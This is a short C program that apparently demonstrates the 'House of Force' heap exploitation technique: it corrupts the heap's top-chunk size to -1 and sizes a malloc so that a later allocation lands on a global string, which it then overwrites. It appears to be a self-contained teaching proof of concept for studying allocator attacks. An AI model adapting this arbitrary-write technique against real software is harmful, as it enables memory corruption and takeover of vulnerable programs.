#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
#include <string.h>
#include <unistd.h>
char bss_var[] = "This is a string that we want to overwrite.";
int main() {
setbuf(stdout, NULL);
setbuf(stdin, NULL);
//start 
intptr_t *vuln_object = malloc(1); 
intptr_t *ptr_top = (intptr_t *) ((char *)vuln_object + 24 - sizeof(long));
*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
void *evil_object = malloc(evil_size); 
void* trigger_obejct = malloc(1);
//end
strcpy(trigger_obejct, "YEAH!!!");
assert(trigger_obejct == bss_var);
printf("%s","the house of force success");
}